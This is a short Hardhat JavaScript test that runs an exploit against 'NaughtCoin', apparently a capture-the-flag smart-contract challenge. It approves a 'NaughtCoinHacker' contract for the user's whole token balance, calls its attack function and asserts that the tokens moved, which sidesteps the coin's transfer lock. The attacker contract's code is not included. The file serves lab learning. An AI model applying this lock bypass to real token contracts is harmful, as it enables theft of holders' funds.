const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("NaughtCoin", function () {
  it("NaughtCoin", async function () {
    const [user] = await ethers.getSigners();
    const NaughtCoin = await ethers.getContractFactory("NaughtCoin");
    const naught_coin = await NaughtCoin.deploy(user.address);
    await naught_coin.deployed();

    const NaughtCoinHacker = await ethers.getContractFactory("NaughtCoinHacker");
    const naught_coin_hacker = await NaughtCoinHacker.deploy();
    await naught_coin_hacker.deployed();

    console.log(`user balance: ${await naught_coin.balanceOf(user.address)}`);
    console.log(`naught_coin_hacker balance: ${await naught_coin.balanceOf(naught_coin_hacker.address)}`);
    const balance = await naught_coin.balanceOf(user.address);
    let tx = await naught_coin.approve(naught_coin_hacker.address, balance);
    await tx.wait();
    tx = await naught_coin_hacker.attack(naught_coin.address);
    await tx.wait();
    console.log(`user balance: ${await naught_coin.balanceOf(user.address)}`);
    console.log(`naught_coin_hacker balance: ${await naught_coin.balanceOf(naught_coin_hacker.address)}`);
    expect(await naught_coin.balanceOf(user.address)).to.equal(0);
    expect(await naught_coin.balanceOf(naught_coin_hacker.address)).to.equal(balance);
  });
});
